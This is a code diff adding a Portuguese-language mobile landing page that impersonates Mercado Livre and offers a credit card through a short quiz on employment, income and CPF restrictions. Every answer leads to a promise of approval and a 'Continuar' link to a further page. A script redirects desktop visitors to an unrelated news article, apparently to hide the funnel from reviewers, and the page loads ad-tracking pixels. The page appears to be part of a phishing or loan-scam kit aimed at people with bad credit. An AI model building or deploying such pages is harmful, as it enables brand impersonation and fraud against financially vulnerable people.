@@ -1,0 +1,261 @@
+<html lang="pt-BR">
+
+<head>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link rel="stylesheet" href="css/all.min.css">
+  <title>Análise de Cartão</title>
+  
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      color: white;
+      text-align: center;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      border-bottom: 1px solid #aa9900;
+      background-color: #FFE600;
+    }
+
+    .header img {
+      width: 125px;
+      padding: 10px;
+    }
+
+    .logo {
+      margin-left: 20px;
+    }
+
+    .content {
+      padding: 20px;
+    }
+
+    .quiz-container {
+      margin: 0 auto;
+      padding: 20px;
+      margin: 0px 15px;
+      border-radius: 10px;
+      background-color: #ffffff;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      margin-top: 20px;
+    }
+
+    .quiz-question {
+      font-family: 'Sora', sans-serif;
+      font-size: 20px;
+      text-align: left;
+      margin-bottom: 20px;
+      margin-top: 0px;
+      color: #1c1c1c;
+    }
+
+    .quiz-option {
+      background-color: #FFE600;
+      color: #1c1c1c;
+      padding: 15px;
+      margin: 5px 0;
+      border-radius: 10px;
+      text-align: center;
+      cursor: pointer;
+      font-family: 'Sora', sans-serif;
+      border: none;
+      width: 100%;
+      font-size: 16px;
+    }
+
+    .quiz-option:hover {
+      background-color: #e6cf00;
+    }
+  </style>
+  
+
+<script type="text/javascript">
+    // Verifica o dispositivo e redireciona antes de carregar outros recursos
+    if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+      window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+    }
+  </script>
+  <script>
+  window.pixelId = "6903840b1d5bdac30702fe0f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+<script>
+  window.pixelId = "6903840b1d5bdac30702fe0f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.tikTokPixelId = "69ef9622c928c0ab98c3bffc";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+</head>
+
+<body>
+
+  <div class="header">
+    <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
+  </div>
+
+  <div class="quiz-container" id="quiz1" style="display: flex; flex-wrap: wrap; justify-content: center;">
+    <h2 class="quiz-question" style="width: 100%; text-align: center;">O que é mais importante para você em um cartão de
+      crédito?</h2>
+
+    <div class="quiz-option" onclick="showQuiz2()" style="background-color: #ffffff; border: 2px solid #FFE600; border-radius: 10px; padding: 10px; text-align: center; cursor: pointer; margin: 5px; width: calc(42% - 10px); height: 100px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+      <i class="fas fa-money-bill-wave" style="font-size: 30px; color: #FFE600;"></i>
+      <p style="font-family: 'Sora', sans-serif; color: #1c1c1c; margin: 5px 0;">Limite alto</p>
+    </div>
+    <div class="quiz-option" onclick="showQuiz2()" style="background-color: #ffffff; border: 2px solid #FFE600; border-radius: 10px; padding: 10px; text-align: center; cursor: pointer; margin: 5px; width: calc(42% - 10px); height: 100px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+      <i class="fas fa-rocket" style="font-size: 30px; color: #FFE600;"></i>
+      <p style="font-family: 'Sora', sans-serif; color: #1c1c1c; margin: 5px 0;">Crédito imediato</p>
+    </div>
+    <div class="quiz-option" onclick="showQuiz2()" style="background-color: #ffffff; border: 2px solid #FFE600; border-radius: 10px; padding: 10px; text-align: center; cursor: pointer; margin: 5px; width: calc(42% - 10px); height: 100px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+      <i class="fas fa-ban" style="font-size: 30px; color: #FFE600;"></i>
+      <p style="font-family: 'Sora', sans-serif; color: #1c1c1c; margin: 5px 0;">Não consultar SPC/Serasa</p>
+    </div>
+    <div class="quiz-option" onclick="showQuiz2()" style="background-color: #ffffff; border: 2px solid #FFE600; border-radius: 10px; padding: 10px; text-align: center; cursor: pointer; margin: 5px; width: calc(42% - 10px); height: 100px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+      <i class="fas fa-calendar-alt" style="font-size: 30px; color: #FFE600;"></i>
+      <p style="font-family: 'Sora', sans-serif; color: #1c1c1c; margin: 5px 0;">Sem anuidade</p>
+    </div>
+  </div>
+
+  <div class="quiz-container" id="quiz2" style="display: none;">
+    <h2 class="quiz-question">Em qual grupo você se encaixa?</h2>
+
+    <button class="quiz-option" onclick="showQuiz3()">Empreendedor</button>
+    <button class="quiz-option" onclick="showQuiz3()">Carteira assinada</button>
+    <button class="quiz-option" onclick="showQuiz3()">Desempregado</button>
+    <button class="quiz-option" onclick="showQuiz3()">Aposentado</button>
+    <button class="quiz-option" onclick="showQuiz3()">Servidor público</button>
+    <button class="quiz-option" onclick="showQuiz3()">Estudante</button>
+    <button class="quiz-option" onclick="showQuiz3()">Autônomo</button>
+  </div>
+
+  <div class="quiz-container" id="quiz3" style="display: none;">
+    <h2 class="quiz-question">Qual sua renda mensal?</h2>
+
+    <button class="quiz-option" onclick="showQuiz4()">Até R$ 1.000</button>
+    <button class="quiz-option" onclick="showQuiz4()">Entre R$ 1.000 e R$ 2.000</button>
+    <button class="quiz-option" onclick="showQuiz4()">Entre R$ 2.000 e R$ 4.000</button>
+    <button class="quiz-option" onclick="showQuiz4()">Acima de R$ 4.000</button>
+  </div>
+
+  <div class="quiz-container" id="quiz4" style="display: none;">
+    <h2 class="quiz-question">Você tem restrições no CPF?</h2>
+
+    <button class="quiz-option" onclick="showModal()">Sim</button>
+    <button class="quiz-option" onclick="showModal()">Não</button>
+  </div>
+
+  <div id="modalOverlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); z-index: 998;">
+  </div>
+  <div id="successModal" class="modal" style="display: none; position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 90%; height: 100%; justify-content: center; align-items: center; z-index: 999;">
+    <div style="background: white; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 400px; position: relative;">
+      <div style="width: 60px; height: 60px; background: #e6fff0; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px;">
+        <i class="fas fa-check" style="color: #00c853; font-size: 30px;"></i>
+      </div>
+      <h2 style="font-family: 'Sora', sans-serif; color: #1c1c1c; font-size: 24px; text-align: center; margin-bottom: 20px;">
+        Temos um cartão perfeito para você!</h2>
+      <p style="font-family: 'Sora', sans-serif; text-align: center; font-size: 16px; color: #666; margin-bottom: 30px;">
+        Conclua seu cadastro e faça seu cartão de crédito agora!</p>
+      <a href="#" class="button" style="font-family: 'Sora', sans-serif; background: #FFE600; color: #1c1c1c; padding: 15px 30px; border-radius: 25px; text-decoration: none; display: inline-block; font-weight: bold; font-size: 16px;">Continuar</a>
+    </div>
+  </div>
+
+  <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+    <div style="max-width: 600px; margin: 0 auto;">
+      <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+        Mercado Livre Brasil LTDA | CNPJ: 79.379.491.0008-50
+      </p>
+      <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+        Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+      </p>
+      <p style="color: #999; font-size: 9px; margin-top: 5px;">
+        © 2025 - Todos os direitos reservados
+      </p>
+    </div>
+  </footer>
+
+  <script>
+    function showQuiz2() {
+      document.getElementById('quiz1').style.display = 'none';
+      document.getElementById('quiz2').style.display = 'block';
+    }
+
+    function showQuiz3() {
+      document.getElementById('quiz2').style.display = 'none';
+      document.getElementById('quiz3').style.display = 'block';
+    }
+
+    function showQuiz4() {
+      document.getElementById('quiz3').style.display = 'none';
+      document.getElementById('quiz4').style.display = 'block';
+    }
+
+    function showModal() {
+      document.getElementById('quiz4').style.display = 'none';
+      document.getElementById('modalOverlay').style.display = 'block';
+      const modal = document.getElementById('successModal');
+      modal.style.display = 'flex';
+    }
+  </script>
+
+  <script>
+    // Função para obter parâmetros da URL
+    function getUrlParams() {
+      const params = {};
+      const urlParams = new URLSearchParams(window.location.search);
+      for (const [key, value] of urlParams) {
+        params[key] = value;
+      }
+      return params;
+    }
+
+    // Função para construir URL com os parâmetros
+    function buildUrlWithParams(baseUrl) {
+      const fullUrl = new URL(baseUrl, window.location.origin);
+      const params = getUrlParams();
+
+      Object.keys(params).forEach(key => {
+        fullUrl.searchParams.append(key, params[key]);
+      });
+
+      return fullUrl.toString();
+    }
+
+    // Adiciona evento de clique nos botões
+    document.addEventListener('DOMContentLoaded', function () {
+      const buttons = document.querySelectorAll('.button');
+      buttons.forEach(button => {
+        button.addEventListener('click', function (e) {
+          e.preventDefault();
+          const finalUrl = buildUrlWithParams('online/3/index.html');
+          window.location.href = finalUrl + window.location.search;
+        });
+      });
+    });
+  </script>
+
+
+</body>
+
+</html>
